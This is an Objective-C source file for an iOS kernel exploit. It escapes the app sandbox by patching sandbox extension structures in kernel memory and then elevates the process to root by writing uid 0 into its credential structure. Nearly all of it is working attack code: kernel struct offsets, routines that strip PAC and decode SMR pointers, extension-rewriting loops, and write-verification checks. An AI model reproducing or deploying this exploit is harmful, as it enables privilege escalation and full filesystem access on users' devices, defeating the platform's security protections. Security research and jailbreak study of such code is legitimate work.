/*
 * sandbox_escape.m — Sandbox escape via kernel memory patching
 *
 * Walk proc_ro → ucred → cr_label → sandbox → ext_set → ext_table
 * Patch extension paths to "/", rewrite class to "com.apple.app-sandbox.read-write"
 * Fill all 16 hash slots → full R+W filesystem access
 * Based on 18.3_sandbox/root.m by CrazyMind90.
 */

#import <Foundation/Foundation.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include "sandbox_escape.h"
#include "kexploit/kexploit_opa334.h"
#include "kexploit/krw.h"
#include "kexploit/kutils.h"
#include "kexploit/offsets.h"

extern void early_kread(uint64_t where, void *read_buf, size_t size);

#define KRW_LEN 0x20

// Verified offsets (IDA binary analysis across 6 kernelcaches)
#define OFF_PROC_PROC_RO       0x18  // proc → proc_ro (stable 17.0-26.x)
#define OFF_PROC_RO_UCRED      0x20  // proc_ro → p_ucred (verified all versions)
#define OFF_UCRED_CR_LABEL     0x78  // ucred → cr_label (KDK struct dump)
#define OFF_LABEL_SANDBOX      0x10  // label → sandbox (MAC l_perpolicy[1])
#define OFF_SANDBOX_EXT_SET    0x10  // sandbox → ext_set
#define OFF_EXT_DATA           0x40  // ext → data_addr
#define OFF_EXT_DATALEN        0x48  // ext → data_len

// posix_cred lives inside ucred at +0x18 (16B cr_link + 8B cr_ref).
// Derived from OFF_UCRED_CR_LABEL=0x78 and sizeof(posix_cred)=0x60.
#define OFF_UCRED_CR_POSIX     0x18
#define OFF_POSIX_CR_UID       0x00
#define OFF_POSIX_CR_RUID      0x04
#define OFF_POSIX_CR_SVUID     0x08
#define OFF_POSIX_CR_NGROUPS   0x0C
#define OFF_POSIX_CR_GROUPS_0  0x10  // first group (cr_groups[0])
#define OFF_POSIX_CR_RGID      0x50
#define OFF_POSIX_CR_SVGID     0x54
#define OFF_POSIX_CR_GMUID     0x58
#define OFF_POSIX_CR_FLAGS     0x5C

#ifdef __arm64e__
static uint64_t __attribute((naked)) __xpaci_sbx(uint64_t a) {
    asm(".long 0xDAC143E0");
    asm("ret");
}
#else
#define __xpaci_sbx(x) (x)
#endif

extern uint64_t VM_MIN_KERNEL_ADDRESS;
extern uint64_t pac_mask;

#define S(x) ({ uint64_t _v = __xpaci_sbx(x); \
    ((_v >> 32) > 0xFFFF ? (_v | pac_mask) : _v); })
#define K(x) ((x) > VM_MIN_KERNEL_ADDRESS)

#pragma mark - Extension patching

// Patch BOTH path->"/" AND class->read-write for a single extension
static int patch_ext_full(uint64_t ext) {
    if (!K(ext)) return -1;

    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
    uint64_t dl = early_kread64(ext + OFF_EXT_DATALEN);
    if (K(da) && dl > 0) {
        uint8_t buf[KRW_LEN];
        early_kread(da, buf, KRW_LEN);
        buf[0] = '/'; buf[1] = 0;
        early_kwrite32bytes(da, buf);
    }

    // Set data_len = 1 (just "/") and extra field
    uint8_t chunk[KRW_LEN];
    early_kread(ext + OFF_EXT_DATA, chunk, KRW_LEN);
    *(uint64_t*)(chunk + 0x08) = 1;
    *(uint64_t*)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;
    early_kwrite32bytes(ext + OFF_EXT_DATA, chunk);

    // Set class to read-write
    da = early_kread64(ext + OFF_EXT_DATA);
    if (!K(da)) return -1;

    const char *rw = "com.apple.app-sandbox.read-write";
    uint8_t b1[KRW_LEN], b2[KRW_LEN];
    memset(b1, 0, KRW_LEN); memset(b2, 0, KRW_LEN);
    memcpy(b1, rw, strlen(rw));
    early_kwrite32bytes(da + 32, b1);
    early_kwrite32bytes(da + 64, b2);
    return 0;
}

// Walk an entire extension chain, patching path+class on EVERY entry
static int patch_chain_full(uint64_t hdr) {
    int n = 0;
    for (int i = 0; i < 64 && K(hdr); i++) {
        uint64_t ext = S(early_kread64(hdr + 0x8));
        if (K(ext)) {
            if (patch_ext_full(ext) == 0) n++;
            // Also set hdr+0x10 to point to class string (cached reference)
            uint64_t da = early_kread64(ext + OFF_EXT_DATA);
            if (K(da)) {
                uint8_t hb[KRW_LEN];
                early_kread(hdr, hb, KRW_LEN);
                *(uint64_t*)(hb + 0x10) = da + 32;
                early_kwrite32bytes(hdr, hb);
            }
        }
        uint64_t next = early_kread64(hdr);
        if (!next || !K(next)) break;
        hdr = S(next);
    }
    return n;
}

#pragma mark - Main entry

int sandbox_escape(uint64_t self_proc) {
    if (!self_proc) { NSLog(@"[SBX] self_proc is NULL"); return -1; }

    uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);
    uint64_t proc_ro = S(proc_ro_raw);
    NSLog(@"[SBX] self_proc=0x%llx proc_ro_raw=0x%llx proc_ro=0x%llx", self_proc, proc_ro_raw, proc_ro);
    if (!K(proc_ro)) { NSLog(@"[SBX] proc_ro invalid"); return -1; }

    // Scan proc_ro for ucred — offset varies by iOS build.
    // p_ucred is an SMR pointer. Dump offsets 0x10-0x40 to find it.
    NSLog(@"[SBX] Scanning proc_ro for ucred...");
    uint64_t ucred = 0;
    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
        uint64_t raw = early_kread64(proc_ro + off);
        uint64_t smr = kread_smrptr(proc_ro + off);
        uint64_t pac = S(raw);
        NSLog(@"[SBX]   proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx", off, raw, smr, pac);

        // Check if smr-decoded value looks like ucred (cr_label at +0x78 is a kernel ptr)
        if (K(smr)) {
            uint64_t maybe_label = S(early_kread64(smr + 0x78));
            if (K(maybe_label)) {
                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
                if (K(maybe_sandbox)) {
                    NSLog(@"[SBX] Found ucred at proc_ro+0x%x (SMR) = 0x%llx", off, smr);
                    ucred = smr;
                    break;
                }
            }
        }
        // Also try PAC-stripped
        if (!ucred && K(pac)) {
            uint64_t maybe_label = S(early_kread64(pac + 0x78));
            if (K(maybe_label)) {
                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
                if (K(maybe_sandbox)) {
                    NSLog(@"[SBX] Found ucred at proc_ro+0x%x (PAC) = 0x%llx", off, pac);
                    ucred = pac;
                    break;
                }
            }
        }
    }
    if (!K(ucred)) { NSLog(@"[SBX] ucred not found in proc_ro"); return -1; }

    uint64_t label = S(early_kread64(ucred + OFF_UCRED_CR_LABEL));
    if (!K(label)) { NSLog(@"[SBX] cr_label invalid"); return -1; }

    uint64_t sandbox = S(early_kread64(label + OFF_LABEL_SANDBOX));
    if (!K(sandbox)) { NSLog(@"[SBX] sandbox invalid"); return -1; }

    uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
    if (!K(ext_set)) { NSLog(@"[SBX] ext_set invalid"); return -1; }

    NSLog(@"[SBX] proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx",
          proc_ro, ucred, label, sandbox, ext_set);

    int patched = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(early_kread64(ext_set + s * 8));
        if (K(hdr)) patched += patch_chain_full(hdr);
    }
    NSLog(@"[SBX] Patched %d extensions with path=/ class=read-write", patched);

    uint64_t src = 0;
    for (int s = 0; s < 16 && !src; s++) {
        uint64_t h = S(early_kread64(ext_set + s * 8));
        if (K(h)) src = h;
    }
    if (src) {
        int filled = 0;
        for (int s = 0; s < 16; s++) {
            uint64_t h = early_kread64(ext_set + s * 8);
            if (!h || !K(h)) { early_kwrite64(ext_set + s * 8, src); filled++; }
        }
        NSLog(@"[SBX] Filled %d empty hash slots with R+W extension", filled);
    }

    // Verify: try to create a file in /var/mobile/Library (sandbox-blocked for most apps)
    // If this succeeds, sandbox patching is working.
    uint64_t verify_ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
    NSLog(@"[SBX] Verification: ext_set after patch = 0x%llx", verify_ext_set);

    int fd_w = open("/var/mobile/Library/.sbx_rw_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/Library/.sbx_rw_test"); }

    if (fd_w >= 0) {
        NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W to /var/mobile/Library/) ***");
        return 0;
    }

    // Fallback verification: try writing to /Library (normally fully blocked)
    fd_w = open("/Library/.sbx_rw_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd_w >= 0) { close(fd_w); unlink("/Library/.sbx_rw_test"); }

    if (fd_w >= 0) {
        NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W to /Library/) ***");
        return 0;
    }

    NSLog(@"[SBX] Sandbox escape write verification failed (errno=%d: %s)", errno, strerror(errno));
    NSLog(@"[SBX] %d extensions were patched but sandbox may still be blocking writes", patched);
    NSLog(@"[SBX] Continuing anyway — apfs_own may bypass remaining restrictions");
    return (patched > 0) ? 0 : -1;
}

#pragma mark - UID elevation (uid=0 via direct ucred posix_cred write)

int sandbox_elevate_to_root(uint64_t self_proc) {
    // On iOS 17+, proc->p_ucred at +0x10 was moved into proc_ro (PPL read-only).
    // Writing to self_proc+0x10 would corrupt p_pid. Instead, we read the ucred
    // address from proc_ro (read-only, PPL allows reads) and write uid=0 directly
    // into the ucred struct (which lives in writable kalloc memory).

    if (!self_proc) {
        NSLog(@"[SBX] elevate: self_proc is NULL");
        return -1;
    }

    uint64_t proc_ro = S(early_kread64(self_proc + OFF_PROC_PROC_RO));
    if (!K(proc_ro)) {
        NSLog(@"[SBX] elevate: cannot read proc_ro");
        return -1;
    }

    // Scan proc_ro for our ucred address (same method as sandbox_escape)
    uint64_t ucred = 0;
    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
        uint64_t raw = early_kread64(proc_ro + off);
        uint64_t smr = kread_smrptr(proc_ro + off);
        uint64_t pac = S(raw);
        uint64_t cands[2] = { smr, pac };
        for (int i = 0; i < 2; i++) {
            uint64_t c = cands[i];
            if (!K(c)) continue;
            uint64_t lbl = S(early_kread64(c + OFF_UCRED_CR_LABEL));
            if (!K(lbl)) continue;
            uint64_t sbx = S(early_kread64(lbl + OFF_LABEL_SANDBOX));
            if (K(sbx)) { ucred = c; break; }
        }
        if (ucred) break;
    }

    if (!ucred) {
        NSLog(@"[SBX] elevate: could not find our ucred via proc_ro scan");
        return -1;
    }
    NSLog(@"[SBX] elevate: our ucred = 0x%llx (via proc_ro)", ucred);

    // Write uid=0 into posix_cred
    // ucred + 0x18 = posix_cred
    // posix_cred + 0x00 = cr_uid, +0x04 = cr_ruid, +0x08 = cr_svuid
    uint64_t posix = ucred + OFF_UCRED_CR_POSIX;
    uint32_t old_uid = early_kread32(posix + OFF_POSIX_CR_UID);
    NSLog(@"[SBX] elevate: current uid in posix_cred = %u", old_uid);

    early_kwrite32(posix + OFF_POSIX_CR_UID, 0);
    early_kwrite32(posix + OFF_POSIX_CR_RUID, 0);
    early_kwrite32(posix + OFF_POSIX_CR_SVUID, 0);

    uint32_t new_uid = early_kread32(posix + OFF_POSIX_CR_UID);
    if (new_uid == 0 && getuid() == 0) {
        NSLog(@"[SBX] elevate success! uid=0");
        return 0;
    }

    NSLog(@"[SBX] elevate: wrote uid=0 but readback=%u getuid()=%d (PPL may have blocked)", new_uid, getuid());
    return -1;
}
